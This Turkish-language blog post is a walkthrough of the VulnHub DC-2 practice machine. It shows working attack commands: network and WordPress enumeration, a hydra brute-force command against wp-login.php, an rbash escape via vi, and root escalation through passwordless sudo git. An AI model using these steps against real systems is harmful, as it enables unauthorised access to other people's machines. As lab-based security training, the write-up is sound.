---
title: "VULNHUB DC-2 Write Up"
date: 2020-09-28T14:55:50+03:00
draft: false
toc: true
images:
tags: [Vulnhub,write-up,sudo,sudoers,vi] 
categories: [write-up]
author : "Barcode"
Description : "Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/dc-2,311/) 'da yer alan DC-2 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar..."
cover : images/vulnhub/dc2/cover.png
  
---

Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/dc-2,311/) 'da yer alan DC-2 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar... :blush:

## 1. Keşif Aşaması

Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.

```bash
netdiscover -i eth1
```

{{< image src="/images/vulnhub/dc2/netdiscover.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Nmap ile portlar ve portlarda çalışan servisler tespit edilir.

```bash
sudo nmap -sV -sC -p- 192.168.56.109
```

{{< image src="/images/vulnhub/dc2/nmap.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}



```192.168.56.109   dc-2``` **/etc/hosts** dosyasına eklenir. 80 portunda çalışan web servisine tarayıcından istek atılır. Wordpress uygulamasının çalıştığı görülmektedir.

{{< image src="/images/vulnhub/dc2/webpage.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Site içerisinde yer alan flag sekmesine tıklanarak ilk flag elde edilir.

{{< image src="/images/vulnhub/dc2/flag1.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Rockyou wordlistinin bir işe yaramayacağı ile ilgili bir not bırakılmış gözüküyor. **Cewl** aracı kullanılarak web sitesinde yer alan metinlerden wordlist oluşturulur.

```bash
cewl -d 3 -m 5 http://dc-2/ -w Wordlist_dc_2.lst
# -d derinlik 
# -m minumum kelime uzunluğu
```
Oluşturulan wordlistin bir kısmı aşağıdaki gibidir.
```txt
─[barcode@parrot]─[~]$ cat Wordlist_dc_2.lst 
vitae
luctus
content
Donec
turpis
Aenean
tincidunt
finibus
dictum
egestas
volutpat
...
...
```
Web dizin taraması gerçekleştilir. Wordpress dosyaları haricinde herhangi bir farklı dosya görülmemektedir.
```bash
gobuster dir -u http://dc-2/ -w /usr/share/wordlists/dirb/big.txt -x .php,.txt
```

```terminal
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://dc-2/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/09/25 07:46:56 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/index.php (Status: 301)
/license.txt (Status: 200)
/server-status (Status: 403)
/wp-admin (Status: 301)
/wp-content (Status: 301)
/wp-includes (Status: 301)
/wp-config.php (Status: 200)
/wp-login.php (Status: 200)
/wp-trackback.php (Status: 200)
===============================================================
2020/09/25 07:47:09 Finished

```
Wordpress için kullanılan wpscan aracı ile tarama gerçekleştirilir.

```bash
wpscan --url http://dc-2/ --enumerate
```
Tarama sonucunda 3 adet kullanıcı adı tespit edilir. Ayrıca wordpress sürümünün 4.7.10 olduğu görülmektedir. 

{{< image src="/images/vulnhub/dc2/wpscan.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Elde edilen kullanıcı adları ile user.txt adında bir wordlist oluşturulur. Daha sonra hydra aracı ile wordpress admin paneline brute-force saldırısı yapılır.

```bash
hydra -L user.txt -P ./Wordlist_dc_2.lst dc-2 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```
{{< image src="/images/vulnhub/dc2/tom.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

{{< image src="/images/vulnhub/dc2/jerry.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}
## 2. Erişim Sağlanması
Jerry kullanıcısı ile login olunur. Pages sekmesine tıklanır ve mevcut sayfalar listelenir. 

{{< image src="/images/vulnhub/dc2/pages.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Flag2 sayfasına tıklanır. ***(Wordpress 4.7.10 sürümünde gizli sayfaların görüntülenmesini sağlayan bir zafiyet bulunmaktadır. http://dc-2/?static=1&order=asc)***

{{< image src="/images/vulnhub/dc2/flag2.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Daha sonra dosya media sekmesinden dosya upload edilemeye çalışıldığında kullanıcının buna yetkili olmadığı tespit edilir. :persevere:

{{< image src="/images/vulnhub/dc2/notupload.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Elde edilen parola bilgileri ssh servisinde denenir ve tom kullanıcı için ssh bağlantısı sağlanır.

```bash
ssh -p 7744 tom@192.168.56.109
```
{{< image src="/images/vulnhub/dc2/ssh.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Terminal ekranında cd vb. birçok komut çalıştırılamamaktadır. Shell türüne bakıldığında rbash olduğu görülmektedir.

{{< image src="/images/vulnhub/dc2/bash.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

İlk olarak çalıştırılabilir komutlar tespit edilir. Dizinde listeleme yapılır. Ayrıca ```echo $PATH``` komutu ile path dizini tespit edilir. ***/home/tom/usr/bin*** klasörü içerisinde tom kullanıcısın çalıştırabileceği komutlar yer almaktadır.

```bash
tom@DC-2:~$ cd usr
-rbash: cd: restricted

tom@DC-2:~$ ls -lsa
total 76
 4 drwxr-x--- 3 tom  tom   4096 Sep 28 07:19 .
 4 drwxr-xr-x 4 root root  4096 Mar 21  2019 ..
 4 -rwxr-x--- 1 tom  tom   1200 Sep 28 07:38 .bash_history
 4 -rwxr-x--- 1 tom  tom     30 Mar 21  2019 .bash_login
 4 -rwxr-x--- 1 tom  tom     30 Mar 21  2019 .bash_logout
 4 -rwxr-x--- 1 tom  tom     30 Mar 21  2019 .bash_profile
 4 -rwxr-x--- 1 tom  tom     30 Mar 21  2019 .bashrc
 4 -rwxr-x--- 1 tom  tom     95 Mar 21  2019 flag3.txt
 4 -rw------- 1 tom  tom     79 Sep 28 07:31 .lesshst
 4 -rwxr-x--- 1 tom  tom     30 Mar 21  2019 .profile
12 -rw------- 1 tom  tom  12288 Sep 27 13:32 .swo
12 -rw------- 1 tom  tom  12288 Sep 27 13:13 .swp
 4 drwxr-x--- 3 tom  tom   4096 Mar 21  2019 usr

tom@DC-2:~$ ls -lsa usr
total 12
4 drwxr-x--- 3 tom tom 4096 Mar 21  2019 .
4 drwxr-x--- 3 tom tom 4096 Sep 28 07:19 ..
4 drwxr-x--- 2 tom tom 4096 Mar 21  2019 bin

tom@DC-2:~$ ls -lsa usr/bin
total 8
4 drwxr-x--- 2 tom tom 4096 Mar 21  2019 .
4 drwxr-x--- 3 tom tom 4096 Mar 21  2019 ..
0 lrwxrwxrwx 1 tom tom   13 Mar 21  2019 less -> /usr/bin/less
0 lrwxrwxrwx 1 tom tom    7 Mar 21  2019 ls -> /bin/ls
0 lrwxrwxrwx 1 tom tom   12 Mar 21  2019 scp -> /usr/bin/scp
0 lrwxrwxrwx 1 tom tom   11 Mar 21  2019 vi -> /usr/bin/vi
```
Vi uygulaması içerisinden bash set edilerek shell değiştirilebilmektedir. Vi uygulaması açılır. Aşağıda yer alan komutlar sıra ile girilir.

```txt
:set shell=/bin/bash
:shell
```
işlem sonunda bash kabuğuna geçilir.  PATH değişkeni /bin ve /usr/bin olacak şekilde ayarlanır.

{{< image src="/images/vulnhub/dc2/path.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Daha sonra tom kullanıcısının home dizininde yer alan flag3.txt okunur.


{{< image src="/images/vulnhub/dc2/flag3.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Jerry kullanıcısının home dizininde yer alan flag4.txt okunur.


{{< image src="/images/vulnhub/dc2/flag4.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}


## 3. Yetki Yükseltme

Sudo -l komutu ile **Tom** kullanıcısının yetkileri kontrol edildiğinde sudo grubuna üye olmadığı/sudoers dosyasında bulunmadığı tespit edilir. Jerry kullacısına ```su jerry``` ile geçiş yapılır. Parola bilgisi olarak wordpress panel giriş şifresi denendiğinde başarılı olunur. :sunglasses:

Jerry kullanıcısı için sudo yetkileri kontrol edildiğinde, git uygulamasını parola girmeden root yetkisi ile çalıştırabildiği görülmektedir.

{{< image src="/images/vulnhub/dc2/git.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Git uygulaması sudo yetkisi ile çalıştırılır ve aşağıda yeralan komutlar girilerek yüksek yetkili bash kabuğuna geçilir.

```bash
sudo git help config
!/bin/bash
```
```bash
root@DC-2:/# cd /root
root@DC-2:~# ls -lsa
total 32
4 drwx------  2 root root 4096 Mar 21  2019 .
4 drwxr-xr-x 21 root root 4096 Mar 10  2019 ..
4 -rw-------  1 root root  207 Mar 21  2019 .bash_history
4 -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
4 -rw-r--r--  1 root root  427 Mar 21  2019 final-flag.txt
4 -rw-------  1 root root   46 Mar 21  2019 .lesshst
4 -rw-------  1 root root  232 Mar 21  2019 .mysql_history
4 -rw-r--r--  1 root root  140 Nov 19  2007 .profile
```
final-flag.txt değeri okunarak çözüm işlemi tamalanır.

{{< image src="/images/vulnhub/dc2/finalflag.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

